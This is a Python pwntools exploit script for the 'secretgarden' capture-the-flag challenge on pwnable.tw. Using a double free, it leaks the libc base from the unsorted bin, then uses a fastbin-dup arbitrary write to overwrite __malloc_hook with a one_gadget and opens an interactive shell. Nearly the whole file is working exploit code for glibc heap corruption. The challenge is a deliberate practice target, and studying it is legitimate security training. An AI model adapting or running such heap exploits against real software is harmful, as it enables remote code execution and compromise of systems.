#!/usr/bin/env python3
from pwn import *

elf = ELF("./secretgarden_patched")
libc = ELF("./given/libc_64.so.6")
ld = ELF("./given/ld-2.23.so")

DUMMY = 0xdeadbeefdeadbeef
PAD = lambda n: b"a" * n
CHUNK_HDR_SIZE = 0x10

if args.REMOTE:
    p = remote("chall.pwnable.tw", 10203)
else:
    p = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
    if args.D:
        context.terminal = ["tmux", "splitw", "-h"]
        with open("/proc/{}/maps".format(p.pid), "rb") as f:
            mem_maps = f.read()
            f.close()
        mem_maps = mem_maps.split(b"\n")
        pie_base = None
        for region in mem_maps:
            if b"secretgarden_patched" in region:
                pie_base = int(region[:region.find(b"-")], 16)
                break
        if pie_base is None:
            quit()
        log.info("PIE base: {}".format(hex(pie_base)))
        gdb.attach(p, "\n".join([
                "b *{}".format(hex(pie_base + 0x10f6)), # exit,
                #"b *{}".format(hex(pie_base + 0xe74)), # free(flower->name)
                "b *{}".format(hex(pie_base + 0xc65)), #malloc(0x28) for flower_struct
            ]))
        log.info("[DATA] garden+0x202040")


flower_slots = [i for i in range(99, -1, -1)]
removed_slots = []
def raise_flower(size, name, color):
    global flower_slots
    assert(len(color) < 23)
    assert(len(name) <= size)
    p.sendlineafter(b"Your choice : ", b"1")
    p.sendlineafter(b"Length of the name :", str(size).encode())
    p.sendafter(b"The name of flower :", name)
    p.sendlineafter(b"The color of the flower :", color)

    index = flower_slots.pop()
    log.info("Raising flower {}".format(index))
    return index

def remove_flower(index, no_return=False):
    global flower_slots
    p.sendlineafter(b"Your choice : ", b"3")
    p.sendlineafter(b"Which flower do you want to remove from the garden:",
                    str(index).encode())
    if no_return:
        return
    msg = p.recvline()
    success = b"Successful" in msg
    if success:
        log.info("{}th flower Removed".format(index))
        removed_slots.append(index)
    return success


def clean_garden():
    global flower_slots, removed_slots
    p.sendlineafter(b"Your choice : ", b"4")
    for removed in removed_slots:
        flower_slots.append(removed)
    flower_slots.sort()
    removed_slots.clear()


def unsorted_bin_leak():
    """
    Leak unsorted bin bk pointer
    """
    unsorted_bin_size = 0x200
    flower_size = 0x28

    # push "a" into unsorted_bin
    a = raise_flower(unsorted_bin_size, p64(DUMMY), p64(DUMMY))
    b = raise_flower(unsorted_bin_size, p64(DUMMY), p64(DUMMY))

    # if no raise/remove() for "c", the unsorted_bin chunk will be used by flower_struct
    # i.e. fastbin takes the unsorted bin memory ()
    c = raise_flower(flower_size, p64(DUMMY), p64(DUMMY))
    remove_flower(a)
    remove_flower(c)

    # this will give us the leak
    d = raise_flower(unsorted_bin_size, PAD(8), p64(DUMMY))

    # visit garden to get the leak
    p.sendlineafter(b"Your choice : ", b"2")
    p.recvuntil("Name of the flower[{}]".format(d).encode())
    leak = p.recvline()
    idx = leak.find(PAD(8)) + 8
    libc_leak = u64(leak[idx:idx+6].ljust(8, b"\x00"))
    log.info("libc leak: {}".format(hex(libc_leak)))
    return libc_leak

def fastbin_dup_arbit_write(fastbin_size, addr, value):
    """
     If the chunk cannot be placed back in the fastbin from which it was removed, then malloc throws
    """
    a = raise_flower(fastbin_size, p64(DUMMY), p64(DUMMY))
    b = raise_flower(fastbin_size, p64(DUMMY), p64(DUMMY))

    remove_flower(a)
    remove_flower(b)
    remove_flower(a)

    raise_flower(fastbin_size, p64(addr - CHUNK_HDR_SIZE), p64(DUMMY))
    raise_flower(fastbin_size, p64(DUMMY), p64(DUMMY))
    raise_flower(fastbin_size, p64(DUMMY), p64(DUMMY))

    # The last line will complain: malloc(): memory corruption (fast)
    # if IT DOES NOT HAVE PROPER SIZE
    # make sure mem[addr]
    victim = raise_flower(fastbin_size, value, p64(DUMMY))
    return victim

def pop_shell():
    """
    The following trick launch as successful fastbin_dup_arbit_write
    """
    size = 0x60
    assert(0x59 <= size <= 0x68)

    # in this challenge we will uses
    log.info("libc __malloc_hook: {}".format(hex(libc.symbols["__malloc_hook"])))
    log.info("See the fake chunk: x/6gx {}".format(hex(libc.sym["__malloc_hook"] - 0x23)))

    # 0x45216 execve("/bin/sh", rsp+0x30, environ)
	# constraints:
  	#    rax == NULL
    one_gadget = libc.address + 0xef6c4
    if args.D:
        # try one gadget
        gdb.attach(p, "b *{}".format(hex(one_gadget)))

    # This exploit the fact that libc address starts with 0x7f**********
    # if the previous slot is NULL, we can get size == 0x7f to bypass corruption check
    victim = fastbin_dup_arbit_write(size,
                                     libc.symbols["__malloc_hook"] - 0x13,
                                     PAD(0x13) + p64(one_gadget))

    remove_flower(victim, no_return=True)

def exploit():
    # leak libc
    libc_leak = unsorted_bin_leak()
    libc.address = libc_leak - 0x3c3b78
    log.info("libc base: {}".format(hex(libc.address)))

    # pop_shell
    pop_shell()

    p.interactive()


if __name__ == "__main__":
    exploit()
